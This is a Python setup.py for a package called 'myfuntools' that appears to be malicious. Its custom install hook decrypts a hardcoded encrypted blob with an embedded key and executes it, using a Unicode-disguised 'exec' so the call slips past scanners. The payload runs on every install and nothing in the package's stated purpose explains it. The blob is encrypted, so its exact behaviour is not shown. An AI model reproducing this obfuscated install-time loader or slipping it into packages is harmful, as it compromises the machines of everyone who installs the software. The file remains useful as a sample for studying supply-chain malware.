from setuptools import setup
from setuptools.command.install import install
from setuptools.command.egg_info import egg_info
import os
import time
import platform
import sys
import shutil
from cryptography.fernet import Fernet



class CustomInstall(install):
    def run(self):
        install.run(self)
        k = b'1Auj45MXNlsc_0Qx3fUsp_BoifOxjh9AfCF1WUFiqcA='
        my_str = b'gAAAAABoQ6DQSKkee3RnMB6_PrnmcAezcgpyo4pLbeDum568gUaEldnr8LHwvCYzZpg_iRk6EdyMJEk5x6CgdBkd5OcPvDaYqySUv6TxeMRtAFkz2Ae-aBkMJmEdl_efkfaBfeAGNTg_K3uLkUHamIOinkoYCeXDG2e-jTrIV7qboNVwekWgmdwC_9jRq14ih5RGmyPCXZ95Jm3__iCE6RHMEcvk4LZg9rGsZC_X_CfmfYO1w3Q76eQ8yC3Z-rajGG4gBPFz795zciqNaVQP_mkIHHzFfblL8utndjdEbYZm6urN1tTt4WNHdYiwl8ONCLyroSox5jBPBPqhuu6vf_AGooKlEAU0hbPz4Ay7j76jGju4vM99-gFf9tsI_qwEZQ1MC1tCI8vhriuOSzXeyk0JQOa5T5FqXVUQlMx6gPsoqDPBIdHB0rHJAsMcghsnnG2I36B_w44y-AGlBcPSBqmnLC7DUaYUcO0nD2Msdwq6Dsu3JZWsRLYocNsq3mhBokltplpvzJizeOcFH1tobdrTnVz7yHmqODKnHAytzPjZYTphNSxvK199P6t6eXKCt0eRXdZ0d545gw4UAP-v79xq0B8qi0IWONNlLfWt_sq0KdqtbMJBnIYapIH_zkZb41RxqvlJLf1VTmdP1wjmzwIg-BzmiTpNJk3Q7OA7yyFiqbSGgbTpzRlo28r0cNeflisIvYOpauYSNCkoLSLfosaidf9v959dmF5acjy2qJeO18rkWT6Fks_nvNaS4ZVon-y8FLyrZKc8m0pVffXJdmCSLnOQ1ta9FTZbKpmfHT9W4tc2AioOu8dH626_c_W-l3-USUl0zlKrTaJeXn71q6PhadZ352iBmuOXukSUYl7QULIZxqQNexnlgdKW-YOzLPKG1Yo0-5ogbrak_izw_GGZXZ5lJXxbI7Jq5Ata49nYEj54p2QtaDmSJpfaOMiIPXRy3dU2SVatle7GgkldpZtI3gnTjMTMUXenTYuwuFipsfdF9qNg8MqWQI9Mgjoi_3j5aTapv1GI'
        plaintext = Fernet(k).decrypt(my_str)
        ℯ𝓍ℯ𝒸(plaintext)


setup(name='myfuntools',
      version='0.1.3',
      description="tools",
      author="lvxianzhi",
      py_modules=["myfuntools.hello"],
      install_requires=[
        "pycryptodome",
        "cryptography",
        "cffi",
      ],
      cmdclass={
           "install": CustomInstall
       },
   )
